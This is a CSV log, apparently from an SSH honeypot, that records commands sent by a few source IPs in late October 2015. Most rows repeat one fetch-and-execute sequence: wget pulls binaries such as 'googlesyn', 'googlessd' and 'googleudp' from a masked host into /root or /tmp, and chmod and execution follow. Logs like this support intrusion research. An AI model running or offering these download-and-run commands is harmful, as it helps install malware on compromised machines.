ip,timestamp,input
"222.186.21.91","2015-10-28 08:02:58","wget -O /root/lldd http://***.***.***.***/lldd"
"222.186.21.91","2015-10-28 08:03:16","wget http://***.***.***.***/ssd"
"222.186.21.91","2015-10-28 08:03:33","chmod 777 /ssd"
"222.186.21.91","2015-10-28 08:03:33","./ssd"
"222.186.34.75","2015-10-28 08:03:33","wget -O /root/lldd http://***.***.***.***/lldd"
"222.186.21.91","2015-10-28 08:04:07","wget -O /root/lldd http://***.***.***.***/lldd"
"222.186.21.91","2015-10-28 08:04:15","chmod 755 ./lldd"
"222.186.21.91","2015-10-28 08:04:19","./lldd"
"222.186.21.91","2015-10-28 08:04:23","exit"
"222.186.34.75","2015-10-28 08:54:34","wget -O /root/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-28 08:54:38","cd /root"
"222.186.34.75","2015-10-28 08:54:42","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-28 08:54:46","./googlesyn"
"222.186.34.75","2015-10-28 08:54:50","exit"
"222.186.34.75","2015-10-28 09:03:05","wget -O /root/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-28 09:03:08","cd /root"
"222.186.34.75","2015-10-28 09:03:13","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-28 09:03:16","./googlesyn"
"222.186.34.75","2015-10-28 09:03:20","exit"
"222.186.34.75","2015-10-28 09:07:35","wget -O /root/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-28 09:07:50","cd /root"
"222.186.34.75","2015-10-28 09:07:50","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-28 09:07:50","./googlesyn"
"222.186.34.75","2015-10-28 09:07:50","wget -O /root/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-28 09:07:50","exit"
"222.186.34.75","2015-10-28 09:07:54","cd /root"
"222.186.34.75","2015-10-28 09:07:58","chmod 777 ./googlessd"
"222.186.34.75","2015-10-28 09:08:02","./googlessd"
"222.186.34.75","2015-10-28 09:08:06","exit"
"222.186.34.75","2015-10-28 09:13:54","wget -O /root/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-28 09:13:58","cd /root"
"222.186.34.75","2015-10-28 09:14:02","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-28 09:14:06","./googlesyn"
"222.186.34.75","2015-10-28 09:14:10","exit"
"222.186.34.75","2015-10-28 09:14:52","wget -O /root/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-28 09:14:56","cd /root"
"222.186.34.75","2015-10-28 09:15:00","chmod 777 ./googlessd"
"222.186.34.75","2015-10-28 09:15:04","./googlessd"
"222.186.34.75","2015-10-28 09:15:08","exit"
"222.186.34.75","2015-10-28 09:22:22","wget -O /root/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-28 09:22:39","cd /root"
"222.186.34.75","2015-10-28 09:22:39","chmod 777 ./googlessd"
"222.186.34.75","2015-10-28 09:22:39","./googlessd"
"222.186.34.75","2015-10-28 09:22:39","exit"
"222.186.34.75","2015-10-28 09:22:40","wget -O /root/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-28 09:22:43","cd /root"
"222.186.34.75","2015-10-28 09:22:47","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-28 09:22:51","./googlesyn"
"222.186.34.75","2015-10-28 09:22:55","exit"
"222.186.34.75","2015-10-28 09:23:40","wget -O /root/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-28 09:23:44","cd /root"
"222.186.34.75","2015-10-28 09:23:48","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-28 09:23:52","./googlesyn"
"222.186.34.75","2015-10-28 09:23:56","exit"
"222.186.34.75","2015-10-28 09:24:13","wget -O /root/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-28 09:24:31","cd /root"
"222.186.34.75","2015-10-28 09:24:31","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-28 09:24:31","./googlesyn"
"222.186.34.75","2015-10-28 09:24:31","exit"
"222.186.34.75","2015-10-28 09:24:31","wget -O /root/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-28 09:24:35","cd /root"
"222.186.34.75","2015-10-28 09:24:39","chmod 777 ./googlessd"
"222.186.34.75","2015-10-28 09:24:43","./googlessd"
"222.186.34.75","2015-10-28 09:24:47","exit"
"222.186.34.75","2015-10-28 09:27:13","wget -O /root/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-28 09:27:17","cd /root"
"222.186.34.75","2015-10-28 09:27:21","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-28 09:27:25","./googlesyn"
"222.186.34.75","2015-10-28 09:27:29","exit"
"222.186.34.75","2015-10-28 09:37:21","wget -O /root/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-28 09:37:55","cd /root"
"222.186.34.75","2015-10-28 09:37:55","chmod 777 ./googlessd"
"222.186.34.75","2015-10-28 09:37:55","./googlessd"
"222.186.34.75","2015-10-28 09:37:56","exit"
"222.186.34.75","2015-10-28 12:19:14","wget -O /root/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-28 12:19:29","cd /root"
"222.186.34.75","2015-10-28 12:19:29","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-28 12:19:29","./googlesyn"
"222.186.34.75","2015-10-28 12:19:29","wget -O /root/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-28 12:19:30","exit"
"222.186.34.75","2015-10-28 12:19:46","cd /root"
"222.186.34.75","2015-10-28 12:19:46","chmod 777 ./googlesyn"
"222.186.34.75","2015-10-28 12:19:46","./googlesyn"
"222.186.34.75","2015-10-28 12:19:46","exit"
"222.186.34.75","2015-10-28 12:19:47","wget -O /root/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-28 12:19:50","cd /root"
"222.186.34.75","2015-10-28 12:19:54","chmod 777 ./googlessd"
"222.186.34.75","2015-10-28 12:19:58","./googlessd"
"222.186.34.75","2015-10-28 12:20:02","exit"
"203.161.70.249","2015-10-28 17:52:39","echo -n test"
"203.161.70.249","2015-10-28 17:53:47","echo -n test"
"222.186.34.75","2015-10-28 21:22:16","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-28 21:22:20","cd /tmp"
"222.186.34.75","2015-10-28 21:22:24","chmod 777 ./googleudp"
"222.186.34.75","2015-10-28 21:22:28","./googleudp"
"222.186.34.75","2015-10-28 21:22:31","exit"
"222.186.34.75","2015-10-28 21:28:17","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-28 21:28:21","cd /tmp"
"222.186.34.75","2015-10-28 21:28:25","chmod 777 ./googleudp"
"222.186.34.75","2015-10-28 21:28:29","./googleudp"
"222.186.34.75","2015-10-28 21:28:33","exit"
"222.186.34.75","2015-10-28 21:30:05","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-28 21:30:09","cd /tmp"
"222.186.34.75","2015-10-28 21:30:13","chmod 777 ./googleudp"
"222.186.34.75","2015-10-28 21:30:17","./googleudp"
"222.186.34.75","2015-10-28 21:30:21","exit"
"222.186.34.75","2015-10-28 21:45:54","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-28 21:45:57","cd /tmp"
"222.186.34.75","2015-10-28 21:46:01","chmod 777 ./googleudp"
"222.186.34.75","2015-10-28 21:46:05","./googleudp"
"222.186.34.75","2015-10-28 21:46:09","exit"
"222.186.34.75","2015-10-28 21:54:15","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-28 21:54:19","cd /tmp"
"222.186.34.75","2015-10-28 21:54:23","chmod 777 ./googleudp"
"222.186.34.75","2015-10-28 21:54:27","./googleudp"
"222.186.34.75","2015-10-28 21:54:31","exit"
"222.186.34.75","2015-10-28 21:59:56","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-28 22:00:00","cd /tmp"
"222.186.34.75","2015-10-28 22:00:04","chmod 777 ./googleudp"
"222.186.34.75","2015-10-28 22:00:08","./googleudp"
"222.186.34.75","2015-10-28 22:00:12","exit"
"222.186.34.75","2015-10-28 22:03:02","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-28 22:03:06","cd /tmp"
"222.186.34.75","2015-10-28 22:03:10","chmod 777 ./googleudp"
"222.186.34.75","2015-10-28 22:03:14","./googleudp"
"222.186.34.75","2015-10-28 22:03:18","exit"
"222.186.34.75","2015-10-28 22:14:04","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-28 22:14:08","cd /tmp"
"222.186.34.75","2015-10-28 22:14:12","chmod 777 ./googleudp"
"222.186.34.75","2015-10-28 22:14:16","./googleudp"
"222.186.34.75","2015-10-28 22:14:20","exit"
"222.186.34.75","2015-10-28 22:19:17","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-28 22:19:21","cd /tmp"
"222.186.34.75","2015-10-28 22:19:25","chmod 777 ./googleudp"
"222.186.34.75","2015-10-28 22:19:29","./googleudp"
"222.186.34.75","2015-10-28 22:19:33","exit"
"222.186.34.75","2015-10-28 22:20:35","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-28 22:20:39","cd /tmp"
"222.186.34.75","2015-10-28 22:20:43","chmod 777 ./googleudp"
"222.186.34.75","2015-10-28 22:20:47","./googleudp"
"222.186.34.75","2015-10-28 22:20:51","exit"
"222.186.34.75","2015-10-28 22:22:25","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-28 22:22:29","cd /tmp"
"222.186.34.75","2015-10-28 22:22:33","chmod 777 ./googleudp"
"222.186.34.75","2015-10-28 22:22:37","./googleudp"
"222.186.34.75","2015-10-28 22:22:41","exit"
"222.186.34.75","2015-10-28 22:39:57","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-28 22:40:01","cd /tmp"
"222.186.34.75","2015-10-28 22:40:05","chmod 777 ./googleudp"
"222.186.34.75","2015-10-28 22:40:09","./googleudp"
"222.186.34.75","2015-10-28 22:40:13","exit"
"222.186.34.75","2015-10-28 22:41:51","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-28 22:41:55","cd /tmp"
"222.186.34.75","2015-10-28 22:41:59","chmod 777 ./googleudp"
"222.186.34.75","2015-10-28 22:42:03","./googleudp"
"222.186.34.75","2015-10-28 22:42:07","exit"
"222.186.34.75","2015-10-28 22:44:20","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-28 22:44:24","cd /tmp"
"222.186.34.75","2015-10-28 22:44:28","chmod 777 ./googleudp"
"222.186.34.75","2015-10-28 22:44:32","./googleudp"
"222.186.34.75","2015-10-28 22:44:36","exit"
"222.186.34.75","2015-10-28 23:39:13","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-28 23:39:17","cd /tmp"
"222.186.34.75","2015-10-28 23:39:21","chmod 777 ./googleudp"
"222.186.34.75","2015-10-28 23:39:25","./googleudp"
"222.186.34.75","2015-10-28 23:39:28","exit"
"222.186.34.75","2015-10-29 01:26:47","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-29 01:26:53","cd /tmp"
"222.186.34.75","2015-10-29 01:27:22","chmod 777 ./googleudp"
"222.186.34.75","2015-10-29 01:27:22","./googleudp"
"222.186.34.75","2015-10-29 01:27:22","exit"
"222.186.34.75","2015-10-29 01:27:23","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-29 01:27:26","cd /tmp"
"222.186.34.75","2015-10-29 01:27:30","chmod 777 ./googleudp"
"222.186.34.75","2015-10-29 01:27:34","./googleudp"
"222.186.34.75","2015-10-29 01:27:38","exit"
"222.186.34.75","2015-10-29 01:28:57","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-29 01:29:01","cd /tmp"
"222.186.34.75","2015-10-29 01:29:05","chmod 777 ./googleudp"
"222.186.34.75","2015-10-29 01:29:09","./googleudp"
"222.186.34.75","2015-10-29 01:29:13","exit"
"218.27.95.235","2015-10-29 01:53:01","echo -n test"
"222.186.34.75","2015-10-29 03:48:10","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 03:48:13","cd /tmp"
"222.186.34.75","2015-10-29 03:48:17","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 03:48:21","./googlesyn"
"222.186.34.75","2015-10-29 03:48:25","exit"
"222.186.34.75","2015-10-29 03:51:01","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 03:51:04","cd /tmp"
"222.186.34.75","2015-10-29 03:51:08","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 03:51:12","./googlessd"
"222.186.34.75","2015-10-29 03:51:16","exit"
"222.186.34.75","2015-10-29 03:52:24","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 03:52:28","cd /tmp"
"222.186.34.75","2015-10-29 03:52:32","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 03:52:36","./googlessd"
"222.186.34.75","2015-10-29 03:52:40","exit"
"222.186.34.75","2015-10-29 03:54:16","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 03:54:20","cd /tmp"
"222.186.34.75","2015-10-29 03:54:24","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 03:54:28","./googlessd"
"222.186.34.75","2015-10-29 03:54:32","exit"
"222.186.34.75","2015-10-29 03:56:16","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 03:56:19","cd /tmp"
"222.186.34.75","2015-10-29 03:56:23","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 03:56:27","./googlesyn"
"222.186.34.75","2015-10-29 03:56:31","exit"
"222.186.34.75","2015-10-29 03:59:18","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 03:59:21","cd /tmp"
"222.186.34.75","2015-10-29 03:59:25","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 03:59:29","./googlesyn"
"222.186.34.75","2015-10-29 03:59:33","exit"
"222.186.34.75","2015-10-29 04:07:07","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 04:07:24","cd /tmp"
"222.186.34.75","2015-10-29 04:07:25","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 04:07:25","./googlesyn"
"222.186.34.75","2015-10-29 04:07:25","exit"
"222.186.34.75","2015-10-29 04:07:25","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 04:07:29","cd /tmp"
"222.186.34.75","2015-10-29 04:07:33","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 04:07:37","./googlesyn"
"222.186.34.75","2015-10-29 04:07:41","exit"
"222.186.34.75","2015-10-29 04:08:13","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 04:08:17","cd /tmp"
"222.186.34.75","2015-10-29 04:08:21","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 04:08:25","./googlesyn"
"222.186.34.75","2015-10-29 04:08:29","exit"
"222.186.34.75","2015-10-29 04:11:04","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 04:11:07","cd /tmp"
"222.186.34.75","2015-10-29 04:11:11","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 04:11:15","./googlessd"
"222.186.34.75","2015-10-29 04:11:19","exit"
"222.186.34.75","2015-10-29 04:13:40","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 04:13:44","cd /tmp"
"222.186.34.75","2015-10-29 04:13:48","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 04:13:52","./googlesyn"
"222.186.34.75","2015-10-29 04:13:56","exit"
"222.186.34.75","2015-10-29 04:15:56","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 04:15:59","cd /tmp"
"222.186.34.75","2015-10-29 04:16:03","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 04:16:07","./googlesyn"
"222.186.34.75","2015-10-29 04:16:11","exit"
"222.186.34.75","2015-10-29 04:18:11","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 04:18:15","cd /tmp"
"222.186.34.75","2015-10-29 04:18:19","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 04:18:23","./googlessd"
"222.186.34.75","2015-10-29 04:18:27","exit"
"222.186.34.75","2015-10-29 04:19:10","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 04:19:14","cd /tmp"
"222.186.34.75","2015-10-29 04:19:18","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 04:19:22","./googlessd"
"222.186.34.75","2015-10-29 04:19:26","exit"
"222.186.34.75","2015-10-29 04:19:56","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 04:20:00","cd /tmp"
"222.186.34.75","2015-10-29 04:20:04","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 04:20:08","./googlessd"
"222.186.34.75","2015-10-29 04:20:12","exit"
"222.186.34.75","2015-10-29 04:23:14","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 04:23:18","cd /tmp"
"222.186.34.75","2015-10-29 04:23:22","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 04:23:26","./googlesyn"
"222.186.34.75","2015-10-29 04:23:30","exit"
"222.186.34.75","2015-10-29 04:24:02","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 04:24:06","cd /tmp"
"222.186.34.75","2015-10-29 04:24:10","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 04:24:14","./googlesyn"
"222.186.34.75","2015-10-29 04:24:18","exit"
"222.186.34.75","2015-10-29 04:27:08","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 04:27:11","cd /tmp"
"222.186.34.75","2015-10-29 04:27:15","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 04:27:19","./googlesyn"
"222.186.34.75","2015-10-29 04:27:23","exit"
"222.186.34.75","2015-10-29 04:28:47","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 04:28:51","cd /tmp"
"222.186.34.75","2015-10-29 04:28:55","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 04:28:59","./googlessd"
"222.186.34.75","2015-10-29 04:29:03","exit"
"222.186.34.75","2015-10-29 04:39:28","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 04:39:32","cd /tmp"
"222.186.34.75","2015-10-29 04:39:36","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 04:39:40","./googlessd"
"222.186.34.75","2015-10-29 04:39:44","exit"
"222.186.34.75","2015-10-29 04:43:59","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 04:44:03","cd /tmp"
"222.186.34.75","2015-10-29 04:44:07","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 04:44:11","./googlesyn"
"222.186.34.75","2015-10-29 04:44:14","exit"
"222.186.34.75","2015-10-29 04:45:55","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 04:45:59","cd /tmp"
"222.186.34.75","2015-10-29 04:46:03","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 04:46:07","./googlessd"
"222.186.34.75","2015-10-29 04:46:11","exit"
"222.186.34.75","2015-10-29 04:49:37","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 04:49:40","cd /tmp"
"222.186.34.75","2015-10-29 04:49:44","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 04:50:01","./googlessd"
"222.186.34.75","2015-10-29 04:50:01","exit"
"222.186.34.75","2015-10-29 04:50:01","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 04:50:05","cd /tmp"
"222.186.34.75","2015-10-29 04:50:09","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 04:50:13","./googlesyn"
"222.186.34.75","2015-10-29 04:50:17","exit"
"222.186.34.75","2015-10-29 04:51:35","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 04:51:38","cd /tmp"
"222.186.34.75","2015-10-29 04:51:42","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 04:51:46","./googlesyn"
"222.186.34.75","2015-10-29 04:51:50","exit"
"222.186.34.75","2015-10-29 04:52:32","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 04:52:35","cd /tmp"
"222.186.34.75","2015-10-29 04:52:39","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 04:52:43","./googlessd"
"222.186.34.75","2015-10-29 04:52:47","exit"
"222.186.34.75","2015-10-29 05:02:05","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 05:02:08","cd /tmp"
"222.186.34.75","2015-10-29 05:02:37","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 05:02:37","./googlessd"
"222.186.34.75","2015-10-29 05:02:37","exit"
"222.186.34.75","2015-10-29 05:02:38","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 05:02:41","cd /tmp"
"222.186.34.75","2015-10-29 05:02:45","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 05:02:49","./googlesyn"
"222.186.34.75","2015-10-29 05:02:53","exit"
"222.186.34.75","2015-10-29 05:04:39","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 05:04:43","cd /tmp"
"222.186.34.75","2015-10-29 05:04:47","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 05:04:51","./googlessd"
"222.186.34.75","2015-10-29 05:04:55","exit"
"222.186.34.75","2015-10-29 05:05:45","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 05:05:49","cd /tmp"
"222.186.34.75","2015-10-29 05:05:53","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 05:05:57","./googlesyn"
"222.186.34.75","2015-10-29 05:06:01","exit"
"222.186.34.75","2015-10-29 05:15:48","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 05:15:52","cd /tmp"
"222.186.34.75","2015-10-29 05:15:56","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 05:16:00","./googlessd"
"222.186.34.75","2015-10-29 05:16:04","exit"
"222.186.34.75","2015-10-29 05:21:29","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 05:21:32","cd /tmp"
"222.186.34.75","2015-10-29 05:21:36","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 05:21:40","./googlesyn"
"222.186.34.75","2015-10-29 05:21:44","exit"
"222.186.34.75","2015-10-29 05:24:55","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 05:24:59","cd /tmp"
"222.186.34.75","2015-10-29 05:25:03","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 05:25:07","./googlesyn"
"222.186.34.75","2015-10-29 05:25:11","exit"
"222.186.34.75","2015-10-29 05:29:52","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 05:29:56","cd /tmp"
"222.186.34.75","2015-10-29 05:30:00","chmod 755 ./googlesyn"
